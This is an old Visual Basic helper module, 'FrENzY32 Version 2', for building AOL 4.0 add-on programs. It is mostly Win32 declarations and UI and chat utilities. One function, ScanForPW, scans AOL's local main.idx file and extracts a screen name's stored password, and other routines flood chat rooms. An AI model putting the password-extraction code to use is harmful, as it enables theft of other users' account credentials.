Attribute VB_Name = "FrENzY32_2"
'FrENzY32 Version 2 By Izekial83
'Made For AOL4.o/Visual Basic 6
'Any Subs Found In Here That Say 'Dos, or 'monkegod
'Are In Here Solely For My Own Use And Also For ANyone
'Who May Be In Need Of Them. If You Find Any Probs
'AIM  - Izekial83
'Mail - Funkdemon@yahoo.com

Option Explicit ' All Variables Declared!!!, LOL
Public Declare Function CreateWindowEx Lib "user32" Alias "CreateWindowExA" (ByVal dwExStyle As Long, ByVal lpClassName As String, ByVal lpWindowName As String, ByVal dwStyle As Long, ByVal X As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hWndParent As Long, ByVal hMenu As Long, ByVal hInstance As Long, lpParam As Any) As Long
Public Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hwndInsertAfter As Long, ByVal X As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wflags As Long) As Long
Public Declare Function CreatePopupMenu Lib "user32" () As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Public Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function GetTopWindow Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Public Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpstring As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpstring As String, ByVal cch As Long) As Long
Public Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Public Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wflags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Public Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wflags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Public Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wflags As Long) As Long
Public Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wflags As Long) As Long
Public Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Public Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Public Declare Function ExtractIcon Lib "shell32.dll" Alias "ExtractIconA" (ByVal hInst As Long, ByVal lpszExeFileName As String, ByVal nIconIndex As Long) As Long
Public Declare Function DrawIcon Lib "user32" (ByVal hdc As Long, ByVal X As Long, ByVal y As Long, ByVal hIcon As Long) As Long
Public Declare Function DestroyIcon Lib "user32" (ByVal hIcon As Long) As Long
Public Declare Function SHAddToRecentDocs Lib "Shell32" (ByVal lFlags As Long, ByVal lPv As Long) As Long
Public Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Public Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Public Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Public Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Public Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Public Declare Function dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source&, ByVal dest&, ByVal nCount&)
Public Declare Function dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source As String, ByVal dest As Long, ByVal nCount&)
Public Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Public Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Public Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Public Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpstring As String)
Public Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
Public Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Public Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Public Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Long) As Long
Public Declare Function sndPlaySound Lib "WinMM.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Public Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal cmd As Long) As Long
Public Declare Function WritePrivateProfileString Lib "Kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lsString As Any, ByVal lplFilename As String) As Long
Public Declare Function GetPrivateProfileInt Lib "Kernel32" Alias "GetPriviteProfileIntA" (ByVal lpApplicationName As String, ByVal lpKeyName As String, ByVal nDefault As Long, ByVal lpFileName As String) As Long
Public Declare Function GetPrivateProfileString Lib "Kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As String, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function GetWindowsDirectory Lib "Kernel" (ByVal lpBuffer As String, ByVal nSize As Integer) As Integer
Public Declare Function DiskSpaceFree Lib "STKIT432.DLL" () As Long
Public Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Public Declare Function fCreateShellLink Lib "STKIT432.DLL" (ByVal lpstrFolderName As String, ByVal lpstrLinkName As String, ByVal lpstrLinkPath As String, ByVal lpstrLinkArguments As String) As Long
Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long
Public Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function CloseHandle Lib "Kernel32" (ByVal hObject As Long) As Long
Public Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Public Declare Function GetFocus Lib "user32" () As Long
Public Declare Function GetWindowWord Lib "user32" (ByVal hwnd As Long, ByVal nIndex As Long) As Integer
Public Declare Function GetModuleFileName Lib "Kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Public Declare Function WindowFromPointXY Lib "user32" Alias "WindowFromPoint" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
Public Declare Function ReleaseCapture Lib "user32" () As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function mciSendString Lib "WinMM.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Public Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal y As Long) As Long
Public Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function RtlMoveMemory Lib "Kernel32" (ByRef dest As Any, ByRef Source As Any, ByVal nBytes As Long)
Private Declare Function EnumDisplaySettings Lib "user32" Alias "EnumDisplaySettingsA" (ByVal lpszDeviceName As Long, ByVal iModeNum As Long, lpDevMode As Any) As Boolean
Private Declare Function ChangeDisplaySettings Lib "user32" Alias "ChangeDisplaySettingsA" (lpDevMode As Any, ByVal dwflags As Long) As Long
Private Declare Function ReadProcessMemory Lib "Kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "Kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function CreateEllipticRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function SetWindowRgn Lib "user32" (ByVal hwnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
Public Declare Sub CopyMemory Lib "Kernel32" Alias "RtlMoveMemory" (destination As Any, Source As Any, ByVal Length As Long)

Public Const PROCESS_READ = &H10
Public Const RIGHTS_REQUIRED = &HF0000
Public Const CB_DELETESTRING = &H144
Public Const CB_FINDSTRINGEXACT = &H158
Public Const CB_RESETCONTENT = &H14B
Public Const GFSR_SYSTEMRESOURCES = 0
Public Const GFSR_GDIRESOURCES = 1
Public Const GFSR_USERRESOURCES = 2
Public Const WM_MDICREATE = &H220
Public Const WM_MDIDESTROY = &H221
Public Const WM_MDIACTIVATE = &H222
Public Const WM_MDIRESTORE = &H223
Public Const WM_MDINEXT = &H224
Public Const WM_MDIMAXIMIZE = &H225
Public Const WM_MDITILE = &H226
Public Const WM_MDICASCADE = &H227
Public Const WM_MDIICONARRANGE = &H228
Public Const WM_MDIGETACTIVE = &H229
Public Const WM_MDISETMENU = &H230
Public Const WM_CUT = &H300
Public Const WM_COPY = &H301
Public Const WM_PASTE = &H302
Public Const SND_SYNC = &H0
Public Const SND_ASYNC = &H1
Public Const SND_NODEFAULT = &H2
Public Const SND_LOOP = &H8
Public Const SND_NOSTOP = &H10
Public Const CCDEVICENAME = 32
Public Const CCFORMNAME = 32
Public Const DM_PELSWIDTH = &H80000
Public Const DM_PELSHEIGHT = &H100000
Public Const conMCIAppTitle = "MCI Control Application"
Public Const conMCIErrInvalidDeviceID = 30257
Public Const conMCIErrDeviceOpen = 30263
Public Const conMCIErrCannotLoadDriver = 30266
Public Const conMCIErrUnsupportedFunction = 30274
Public Const conMCIErrInvalidFile = 30304
Public Const FADE_RED = &HFF&
Public Const FADE_GREEN = &HFF00&
Public Const FADE_BLUE = &HFF0000
Public Const FADE_YELLOW = &HFFFF&
Public Const FADE_WHITE = &HFFFFFF
Public Const FADE_BLACK = &H0&
Public Const FADE_PURPLE = &HFF00FF
Public Const FADE_GREY = &HC0C0C0
Public Const FADE_PINK = &HFF80FF
Public Const FADE_TURQUOISE = &HC0C000
Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_MOVE = &HF012
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203
Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3
Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181
Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9
Public Const VK_UP = &H26
Public Const SWP_NOMOVE = 2
Public Const SWP_NOSIZE = 1
Public Const flags = SWP_NOMOVE Or SWP_NOSIZE
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const HWND_TOP = 0
Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1
Public Const WM_SYSCOMMAND = &H112
Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&
Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)
Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000

Private Type DEVMODE
    dmDeviceName As String * CCDEVICENAME
    dmSpecVersion As Integer
    dmDriverVersion As Integer
    dmSize As Integer
    dmDriverExtra As Integer

    dmFields As Long
    dmOrientation As Integer
    dmPaperSize As Integer
    dmPaperLength As Integer
    dmPaperWidth As Integer
    dmScale As Integer
    dmCopies As Integer
    dmDefaultSource As Integer
    dmPrintQuality As Integer
    dmColor As Integer
    dmDuplex As Integer
    dmYResolution As Integer
    dmTTOption As Integer
    dmCollate As Integer

    dmFormName As String * CCFORMNAME
    dmUnusedPadding As Integer
    dmBitsPerPel As Integer
    dmPelsWidth As Long
    dmPelsHeight As Long
    dmDisplayFlags As Long
    dmDisplayFrequency As Long
End Type
Dim DevM As DEVMODE

Type COLORRGB
  Red As Long
  Green As Long
  Blue As Long
End Type

Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Type POINTAPI
   X As Long
   y As Long
End Type

Public DialogCaption As String
Function ActivateAOL()
Dim AOL As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
AppActivate (AOL&)
End Function
Sub Form_Center(F As Form)
    F.Top = (Screen.Height * 0.85) / 2 - F.Height / 2
    F.Left = Screen.Width / 2 - F.Width / 2
End Sub


Function BlankString() As String
    BlankString$ = Chr(32) & Chr(160)
End Function
Function SetAsAOLChild(Form As Form, XPosition, YPosition)
'FiXed
Dim AOL As Long, Toolbar As Long
    Form.Top = YPosition
    Form.Left = XPosition
AOL& = FindWindow("AOL Frame25", vbNullString)
Toolbar = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Call SetParent(Form.hwnd, AOL&)
    Call ShowWindow(AOL&, 2)
    Call ShowWindow(AOL&, 3)
End Function
Function MakeIt3d(TheForm As Form, TheControl As Control)
Dim OldMode As Long
If TheForm.AutoRedraw = False Then
    OldMode = TheForm.ScaleMode
        TheForm.ScaleMode = 3
        TheForm.AutoRedraw = True
        TheForm.CurrentX = TheControl.Left - 1
        TheForm.CurrentY = TheControl.Top + TheControl.Height
        TheForm.Line -Step(0, -(TheControl.Height + 1)), RGB(90, 90, 90)
        TheForm.Line -Step(TheControl.Width + 1, 0), RGB(90, 90, 90)
        TheForm.Line -Step(0, TheControl.Height + 1), RGB(255, 255, 255)
        TheForm.Line -Step(-(TheControl.Width + 1), 0), RGB(255, 255, 255)
        TheForm.AutoRedraw = False
    TheForm.ScaleMode = OldMode
End If
If TheForm.AutoRedraw = True Then
    OldMode = TheForm.ScaleMode
        TheForm.ScaleMode = 3
        TheForm.CurrentX = TheControl.Left - 1
        TheForm.CurrentY = TheControl.Top + TheControl.Height
        TheForm.Line -Step(0, -(TheControl.Height + 1)), RGB(90, 90, 90)
        TheForm.Line -Step(TheControl.Width + 1, 0), RGB(90, 90, 90)
        TheForm.Line -Step(0, TheControl.Height + 1), RGB(255, 255, 255)
        TheForm.Line -Step(-(TheControl.Width + 1), 0), RGB(255, 255, 255)
    TheForm.ScaleMode = OldMode
End If
End Function
Function STR_3D(Text)
Dim X As Long, iLeft As Integer, iTop As Integer
Dim CurrentY As Long, CurrentX As Long
    Text.ScaleMode = 3
    Text.FontSize = 24
    Text.ForeColor = &H808080
    iTop = 15
    iLeft = 5
For X& = 0 To 7
CurrentX = iLeft + X&
CurrentY = iTop + X&
Text.Left = CurrentX
Text.Top = CurrentY
    If X& = 7 Then Text.ForeColor = &HFFFF00
Next
End Function
Function ScanForPW(SName As String, AolPath As String) As String
'Retreives PW From The Main.IdX File In The AOL Dir
Static FBuff As String * 40000, NBuff As String * 20
Dim Fblen As Long, Fbchnk As Long, StrFound As Integer
Dim sPath As String, X As Long, NChar As Long, NXChar As Long
sPath$ = AolPath$
Open sPath$ For Binary As #1
Fbchnk& = LOF(1)
Fblen& = 1
Do: DoEvents
FBuff = String$(40000, Chr$(0))
Get #1, Fblen&, FBuff
If InStrB(UCase$(FBuff), UCase$(SName$) & Chr$(0)) Or InStrB(UCase$(FBuff), UCase$(SName$) & Chr$(32)) Then
    StrFound = InStrB(UCase$(FBuff), UCase$(SName$) & Chr$(0))
    If StrFound = 0 Then
        StrFound = InStrB(UCase$(FBuff), UCase$(SName$) & Chr$(32))
    End If
    NBuff = String$(20, Chr$(0))
    Get #1, Fblen& + (StrFound - 1), NBuff
End If
If (Fblen& + 40000) > Fbchnk& And Fblen& <> Fbchnk& Then
    Fblen& = Fblen& + (Fbchnk& - Fblen&)
Else
    Fblen& = Fblen& + 40000
End If
Loop Until Fblen& > Fbchnk&
Close #1

For X = 1 To Len(NBuff)
    NChar = InStr(Mid$(NBuff, X, 1), Chr(0))
    If NChar <> 0 Then
        NXChar = X - NChar
    End If
Next X
ScanForPW$ = Left(NBuff, Len(NBuff) - (Len(NBuff) - NXChar))
End Function

Sub Scroll_MultiLine(What)
'This Will Scroll Your Text 79 Times In the Same ChatSend
Dim X As Long
For X = 1 To 100
    X = X + What
Next
Call SendChat(".<p=" & X)
End Sub
Sub AddAsciiToCombo(Combo As ComboBox)
Dim X As Long
For X = 33 To 255
    Combo.AddItem Chr(X) & ""
Next X
End Sub

Sub StartScreenSaver()
    Const WM_SYSCOMMAND = &H112
    Const SC_SCREENSAVE = &HF140
       Call SendMessage(-1, WM_SYSCOMMAND, SC_SCREENSAVE, 0&)
End Sub


Function STR_Code(sSTR As String)
Dim Made As String, sSTRLen As Long, NumSpaces As Long
Dim NextChr As String, NwO As String
    Let Made$ = sSTR
    Let sSTRLen& = Len(Made$)
Do While NumSpaces& <= sSTRLen&
    Let NumSpaces& = NumSpaces& + 1
    Let NextChr$ = Mid$(Made$, NumSpaces&, 1)
If NextChr$ = "A" Then Let NextChr$ = "š"
If NextChr$ = "B" Then Let NextChr$ = "œ"
If NextChr$ = "C" Then Let NextChr$ = "¢"
If NextChr$ = "D" Then Let NextChr$ = "¤"
If NextChr$ = "E" Then Let NextChr$ = "±"
If NextChr$ = "F" Then Let NextChr$ = "°"
If NextChr$ = "G" Then Let NextChr$ = "²"
If NextChr$ = "H" Then Let NextChr$ = "³"
If NextChr$ = "I" Then Let NextChr$ = "µ"
If NextChr$ = "J" Then Let NextChr$ = "ª"
If NextChr$ = "K" Then Let NextChr$ = "¹"
If NextChr$ = "L" Then Let NextChr$ = "º"
If NextChr$ = "M" Then Let NextChr$ = "Ÿ"
If NextChr$ = "N" Then Let NextChr$ = "í"
If NextChr$ = "O" Then Let NextChr$ = "î"
If NextChr$ = "P" Then Let NextChr$ = "ï"
If NextChr$ = "Q" Then Let NextChr$ = "ð"
If NextChr$ = "R" Then Let NextChr$ = "ñ"
If NextChr$ = "S" Then Let NextChr$ = "ò"
If NextChr$ = "T" Then Let NextChr$ = "ó"
If NextChr$ = "U" Then Let NextChr$ = "ô"
If NextChr$ = "V" Then Let NextChr$ = "õ"
If NextChr$ = "W" Then Let NextChr$ = "ö"
If NextChr$ = "X" Then Let NextChr$ = "ø"
If NextChr$ = "Y" Then Let NextChr$ = "ù"
If NextChr$ = "Z" Then Let NextChr$ = "ú"
If NextChr$ = " " Then Let NextChr$ = " "
If NextChr$ = "a" Then Let NextChr$ = "'"
If NextChr$ = "b" Then Let NextChr$ = "û"
If NextChr$ = "c" Then Let NextChr$ = "ü"
If NextChr$ = "d" Then Let NextChr$ = "ý"
If NextChr$ = "e" Then Let NextChr$ = "þ"
If NextChr$ = "f" Then Let NextChr$ = "Æ"
If NextChr$ = "g" Then Let NextChr$ = "Ç"
If NextChr$ = "h" Then Let NextChr$ = "Ì"
If NextChr$ = "i" Then Let NextChr$ = "Í"
If NextChr$ = "j" Then Let NextChr$ = "Î"
If NextChr$ = "k" Then Let NextChr$ = "Ï"
If NextChr$ = "l" Then Let NextChr$ = "Ø"
If NextChr$ = "m" Then Let NextChr$ = "Þ"
If NextChr$ = "n" Then Let NextChr$ = "ß"
If NextChr$ = "o" Then Let NextChr$ = "†"
If NextChr$ = "p" Then Let NextChr$ = "ƒ"
If NextChr$ = "q" Then Let NextChr$ = "Œ"
If NextChr$ = "r" Then Let NextChr$ = "Š"
If NextChr$ = "s" Then Let NextChr$ = "‡"
If NextChr$ = "t" Then Let NextChr$ = "¡"
If NextChr$ = "u" Then Let NextChr$ = "£"
If NextChr$ = "v" Then Let NextChr$ = "§"
If NextChr$ = "w" Then Let NextChr$ = "ì"
If NextChr$ = "x" Then Let NextChr$ = "ë"
If NextChr$ = "y" Then Let NextChr$ = "ê"
If NextChr$ = "z" Then Let NextChr$ = "é"
If NextChr$ = "1" Then Let NextChr$ = "è"
If NextChr$ = "2" Then Let NextChr$ = "ç"
If NextChr$ = "3" Then Let NextChr$ = "æ"
If NextChr$ = "4" Then Let NextChr$ = "á"
If NextChr$ = "5" Then Let NextChr$ = "å"
If NextChr$ = "6" Then Let NextChr$ = "â"
If NextChr$ = "7" Then Let NextChr$ = "ã"
If NextChr$ = "8" Then Let NextChr$ = "ä"
If NextChr$ = "9" Then Let NextChr$ = "à"
If NextChr$ = "0" Then Let NextChr$ = "×"
    Let NwO$ = NwO$ + NextChr$
Loop
STR_Code = NwO$
End Function
Function STR_DeCode(sSTR As String)
Dim Made As String, sSTRLen As Long, NumSpaces As Long
Dim NextChr As String, NwO As String
    Let Made$ = sSTR
    Let sSTRLen = Len(Made$)
Do While NumSpaces& <= sSTRLen
    Let NumSpaces& = NumSpaces& + 1
    Let NextChr$ = Mid$(Made$, NumSpaces&, 1)
If NextChr$ = "š" Then Let NextChr$ = "A"
If NextChr$ = "œ" Then Let NextChr$ = "B"
If NextChr$ = "¢" Then Let NextChr$ = "C"
If NextChr$ = "¤" Then Let NextChr$ = "D"
If NextChr$ = "±" Then Let NextChr$ = "E"
If NextChr$ = "°" Then Let NextChr$ = "F"
If NextChr$ = "²" Then Let NextChr$ = "G"
If NextChr$ = "³" Then Let NextChr$ = "H"
If NextChr$ = "µ" Then Let NextChr$ = "I"
If NextChr$ = "ª" Then Let NextChr$ = "J"
If NextChr$ = "¹" Then Let NextChr$ = "K"
If NextChr$ = "º" Then Let NextChr$ = "L"
If NextChr$ = "Ÿ" Then Let NextChr$ = "M"
If NextChr$ = "í" Then Let NextChr$ = "N"
If NextChr$ = "î" Then Let NextChr$ = "O"
If NextChr$ = "ï" Then Let NextChr$ = "P"
If NextChr$ = "ð" Then Let NextChr$ = "Q"
If NextChr$ = "ñ" Then Let NextChr$ = "R"
If NextChr$ = "ò" Then Let NextChr$ = "S"
If NextChr$ = "ó" Then Let NextChr$ = "T"
If NextChr$ = "ô" Then Let NextChr$ = "U"
If NextChr$ = "õ" Then Let NextChr$ = "V"
If NextChr$ = "ö" Then Let NextChr$ = "W"
If NextChr$ = "ø" Then Let NextChr$ = "X"
If NextChr$ = "ù" Then Let NextChr$ = "Y"
If NextChr$ = "ú" Then Let NextChr$ = "Z"
If NextChr$ = " " Then Let NextChr$ = " "
If NextChr$ = "'" Then Let NextChr$ = "a"
If NextChr$ = "û" Then Let NextChr$ = "b"
If NextChr$ = "ü" Then Let NextChr$ = "c"
If NextChr$ = "ý" Then Let NextChr$ = "d"
If NextChr$ = "þ" Then Let NextChr$ = "e"
If NextChr$ = "Æ" Then Let NextChr$ = "f"
If NextChr$ = "Ç" Then Let NextChr$ = "g"
If NextChr$ = "Ì" Then Let NextChr$ = "h"
If NextChr$ = "Í" Then Let NextChr$ = "i"
If NextChr$ = "Î" Then Let NextChr$ = "j"
If NextChr$ = "Ï" Then Let NextChr$ = "k"
If NextChr$ = "Ø" Then Let NextChr$ = "l"
If NextChr$ = "Þ" Then Let NextChr$ = "m"
If NextChr$ = "ß" Then Let NextChr$ = "n"
If NextChr$ = "†" Then Let NextChr$ = "o"
If NextChr$ = "ƒ" Then Let NextChr$ = "p"
If NextChr$ = "Œ" Then Let NextChr$ = "q"
If NextChr$ = "Š" Then Let NextChr$ = "r"
If NextChr$ = "‡" Then Let NextChr$ = "s"
If NextChr$ = "¡" Then Let NextChr$ = "t"
If NextChr$ = "£" Then Let NextChr$ = "u"
If NextChr$ = "§" Then Let NextChr$ = "v"
If NextChr$ = "ì" Then Let NextChr$ = "w"
If NextChr$ = "ë" Then Let NextChr$ = "x"
If NextChr$ = "ê" Then Let NextChr$ = "y"
If NextChr$ = "é" Then Let NextChr$ = "z"
If NextChr$ = "è" Then Let NextChr$ = "1"
If NextChr$ = "ç" Then Let NextChr$ = "2"
If NextChr$ = "æ" Then Let NextChr$ = "3"
If NextChr$ = "á" Then Let NextChr$ = "4"
If NextChr$ = "å" Then Let NextChr$ = "5"
If NextChr$ = "â" Then Let NextChr$ = "6"
If NextChr$ = "ã" Then Let NextChr$ = "7"
If NextChr$ = "ä" Then Let NextChr$ = "8"
If NextChr$ = "à" Then Let NextChr$ = "9"
If NextChr$ = "×" Then Let NextChr$ = "0"
    Let NwO$ = NwO$ + NextChr$
Loop
STR_DeCode = NwO$
End Function


Sub Chat_Annoy()
'This Is FuN
    Call SendChat("{s *a:\spinning}{s *a:\}")
End Sub
Function Chat_RoomName()
    Chat_RoomName = Val(GetCaption(FindChatRoom))
End Function
Sub AAA_FromIzekial83_AAA()
'Aiight, Now I Hope That The Only Use Of This Bas Is
'For AOL, I Have Created Subs That Are In This Bas For
'Windows Functions. Now, I Know Most Progs These Days
'Are Lame, Boring, Not Original, And Thrown Together
'With This Bas You Can Create A Prog That ReadsINI's
'Writes Logs, And Much More, those are 2 things that
'progs are starting to use more often. Thats good
'Anyone can make a prog. ANYONE. Simple As That
'Not Everyone Can Make A GOOD Prog. For Instance,
'Below Is The Good Way to Make A Phader And The Lame Way
'Lame Way:
'   Call Fade(Text1, Chat1)
'Good Way
'DoWavy& = ReadINI("MY Prog 2.o", "Wavy", "C:\Prog.ini")
'   If DoWavy& = True Then Str2Fade$ = FadeByColor3(Fade_Blue, Fade_Green, Fade_Blue, Text1, True)
'       Chat1.ChatSend(STR2Fade$)
'   If DoWavy& = False Then Str2Fade$ = FadeByColor3(Fade_Blue, Fade_Green, Fade_Blue, Text1, False)
